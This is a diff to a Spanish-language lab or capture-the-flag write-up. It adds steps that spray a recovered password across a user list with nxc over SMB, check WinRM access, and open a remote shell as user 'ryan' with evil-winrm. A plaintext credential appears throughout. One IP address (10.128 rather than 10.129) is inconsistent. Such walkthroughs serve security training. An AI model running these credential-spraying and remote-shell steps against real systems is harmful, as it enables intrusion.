@@ -250,9 +250,26 @@ type sql-Configuration.INI
 ```
 
 Encontramos una contraseña `WqSZAF6CysDQbGb3` la guardamos en nuestro fichero de contraseñas
-Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quin le pertenece
+Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quien le pertenece
+```shell
+nxc smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'
+```
 
+Encontramos que las credenciales pertenecen a `ryan`
+```ad-hint
+ryan::WqSZAF6CysDQbGb3
+```
 
+### Shell ryan
 
+Vamos a validar si el usuario pertenece a `Remote Management` 
+```shell
+nxc winrm 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
+```
+
+Vemos que pertenece asi que nos conectamos
+```shell
+evil-winrm -i 10.128.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
+```
 
 
